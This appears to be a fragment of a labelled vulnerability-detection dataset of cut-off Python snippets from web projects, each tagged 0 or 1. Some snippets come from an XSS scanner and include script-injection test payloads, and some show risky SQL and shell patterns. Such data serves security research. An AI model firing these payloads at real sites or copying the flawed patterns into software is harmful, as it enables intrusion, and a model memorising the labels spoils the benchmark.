attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,", "label": 0}, {"snippet_id": 19584, "code": "(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler", "label": 0}, {"snippet_id": 42283, "code": "\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self", "label": 0}, {"snippet_id": 40821, "code": ": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", ", "label": 0}, {"snippet_id": 7964, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 42875, "code": " _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t", "label": 0}, {"snippet_id": 1289, "code": " if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid)", "label": 0}, {"snippet_id": 44359, "code": "(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) ", "label": 1}, {"snippet_id": 49395, "code": " in self.query_params: selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None", "label": 0}, {"snippet_id": 39437, "code": "\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message", "label": 0}, {"snippet_id": 48792, "code": ".translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object", "label": 0}, {"snippet_id": 14846, "code": " \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else", "label": 0}, {"snippet_id": 31377, "code": " \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t", "label": 0}, {"snippet_id": 46201, "code": ", 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection", "label": 0}, {"snippet_id": 2122, "code": "?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 34891, "code": " no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]", "label": 0}, {"snippet_id": 10618, "code": "=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir ", "label": 0}, {"snippet_id": 15874, "code": " 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/", "label": 0}, {"snippet_id": 36888, "code": "\"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local", "label": 1}, {"snippet_id": 2183, "code": " headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='", "label": 0}, {"snippet_id": 30876, "code": "]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act==", "label": 0}, {"snippet_id": 34962, "code": " not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db", "label": 0}, {"snippet_id": 7401, "code": " include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/',", "label": 0}, {"snippet_id": 39025, "code": " int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype", "label": 0}, {"snippet_id": 42207, "code": " convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields:", "label": 0}, {"snippet_id": 19190, "code": "' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super", "label": 0}, {"snippet_id": 769, "code": "(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers", "label": 0}, {"snippet_id": 45288, "code": ", description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties", "label": 0}, {"snippet_id": 40049, "code": ".throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta", "label": 0}, {"snippet_id": 6517, "code": "'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details. If not set, an in-memory SSO session cache will be used. \"\"", "label": 0}, {"snippet_id": 41366, "code": "\tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 45578, "code": "'coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json", "label": 1}, {"snippet_id": 15853, "code": ".pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": ", "label": 0}, {"snippet_id": 32259, "code": "=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?', help='open file in browser') args=parser", "label": 0}, {"snippet_id": 43628, "code": " in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None,", "label": 0}, {"snippet_id": 17248, "code": "<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')", "label": 0}, {"snippet_id": 175, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url", "label": 0}, {"snippet_id": 28365, "code": "\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept", "label": 0}, {"snippet_id": 31217, "code": ") \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t\t if form.getvalue", "label": 0}, {"snippet_id": 20696, "code": "?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"", "label": 0}, {"snippet_id": 53710, "code": " j2_env.get_template('templates/eb/config.yml').render( APPLICATION_NAME=application_name, DEFAULT_REGION=default_region ) def write_eb_config(dest, application_name, default_region): contents=make_eb_config", "label": 0}, {"snippet_id": 32270, "code": " external port') parser.add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv) top_level=os.path.realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost", "label": 0}, {"snippet_id": 21238, "code": ".course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index", "label": 1}, {"snippet_id": 1379, "code": "], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert", "label": 0}, {"snippet_id": 34338, "code": ".dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif", "label": 0}, {"snippet_id": 49403, "code": "==list: selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None: return True return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self", "label": 0}, {"snippet_id": 32812, "code": " def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found<", "label": 0}, {"snippet_id": 3096, "code": ") !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload)", "label": 0}, {"snippet_id": 13211, "code": "'auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 33616, "code": ".published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, ", "label": 0}, {"snippet_id": 25225, "code": " NamePartsWidget(forms.MultiWidget): widget=forms.TextInput def __init__(self, scheme: dict, field: forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size in self", "label": 0}, {"snippet_id": 14310, "code": "='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 29136, "code": " \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system", "label": 0}, {"snippet_id": 8838, "code": ".render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'),", "label": 0}, {"snippet_id": 19638, "code": " def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir", "label": 0}, {"snippet_id": 2424, "code": " api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line:", "label": 0}, {"snippet_id": 16493, "code": " import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/", "label": 0}, {"snippet_id": 29148, "code": "\thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" ", "label": 0}, {"snippet_id": 8207, "code": "'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 9288, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 40985, "code": "+self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 41619, "code": " `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value", "label": 0}, {"snippet_id": 42888, "code": "') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch", "label": 0}, {"snippet_id": 8593, "code": "'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 52059, "code": " Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission", "label": 1}, {"snippet_id": 1345, "code": ") except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body", "label": 0}, {"snippet_id": 36271, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] ", "label": 0}, {"snippet_id": 6064, "code": ", 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages':[], 'verify_request_signatures': '0', 'status_test_usernames':[], 'signup_link", "label": 1}, {"snippet_id": 38164, "code": "\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children():", "label": 0}, {"snippet_id": 10036, "code": "\"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS", "label": 0}, {"snippet_id": 14309, "code": ".course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'", "label": 0}, {"snippet_id": 12402, "code": "/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 18679, "code": "[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(", "label": 0}, {"snippet_id": 36801, "code": "\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog", "label": 0}, {"snippet_id": 35147, "code": "\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself", "label": 0}, {"snippet_id": 42587, "code": " \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError", "label": 0}, {"snippet_id": 55088, "code": "({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects=Project.objects.filter(pk__in=projects_pk.distinct()) for project in projects: if( not request.user.can_translate", "label": 0}, {"snippet_id": 24852, "code": ": \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec", "label": 0}, {"snippet_id": 11457, "code": "-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost", "label": 0}, {"snippet_id": 5504, "code": "<html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q", "label": 0}, {"snippet_id": 33519, "code": " \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate", "label": 0}, {"snippet_id": 49379, "code": " def get_title(self): return self.label def get_url(self): return self.get_url_with_query_params({ self.field_name: self.value }) def is_active(self): if self.field_name in self.query_params: selected_value", "label": 0}, {"snippet_id": 29878, "code": " style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ ", "label": 0}, {"snippet_id": 37604, "code": "\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route", "label": 0}, {"snippet_id": 14610, "code": "{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str", "label": 0}, {"snippet_id": 39095, "code": " be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns", "label": 0}, {"snippet_id": 23053, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 2564, "code": ":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else:", "label": 0}, {"snippet_id": 51286, "code": "' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins'", "label": 0}, {"snippet_id": 8946, "code": "', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/", "label": 0}, {"snippet_id": 3495, "code": ",method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try:", "label": 0}, {"snippet_id": 44378, "code": ".get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.", "label": 0}, {"snippet_id": 17568, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE')", "label": 0}, {"snippet_id": 14756, "code": "(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 31090, "code": ") \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"add_vrrp", "label": 0}, {"snippet_id": 18824, "code": " 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns", "label": 0}, {"snippet_id": 52780, "code": ".fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form", "label": 0}, {"snippet_id": 26420, "code": " re DEBUG=0 xss_attacks=[ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\", \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\", \"</title><script>alert(1)", "label": 1}, {"snippet_id": 45057, "code": ": try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with", "label": 0}, {"snippet_id": 11042, "code": " bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have", "label": 0}, {"snippet_id": 1759, "code": " print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>", "label": 0}, {"snippet_id": 22413, "code": "': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/", "label": 0}, {"snippet_id": 2995, "code": ",'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 36833, "code": "(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe", "label": 1}, {"snippet_id": 30057, "code": ": \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path)) \t\t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload", "label": 0}, {"snippet_id": 48068, "code": ".replace(\" \", \"_\")) low_res_file_name=upload_base_path +'/LOWRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK", "label": 0}, {"snippet_id": 51726, "code": "'Dashboard'), 'items':[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ ", "label": 1}, {"snippet_id": 8969, "code": "*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch", "label": 0}, {"snippet_id": 18124, "code": "', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 29731, "code": "\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport", "label": 0}, {"snippet_id": 30479, "code": " sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t", "label": 0}, {"snippet_id": 11673, "code": "', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 54786, "code": "']) return context def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"", "label": 0}, {"snippet_id": 2455, "code": "(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain')", "label": 0}, {"snippet_id": 6630, "code": " True. \"\"\" res=self.config.get(self.section, 'verify_request_signatures') return bool(int(res)) @property def status_test_usernames(self): \"\"\" Get list of usernames valid for use with the /status URL. If", "label": 0}, {"snippet_id": 7309, "code": "'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP", "label": 0}, {"snippet_id": 32703, "code": "') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile", "label": 0}, {"snippet_id": 18929, "code": "/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views", "label": 0}, {"snippet_id": 14863, "code": " else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"", "label": 0}, {"snippet_id": 21875, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): 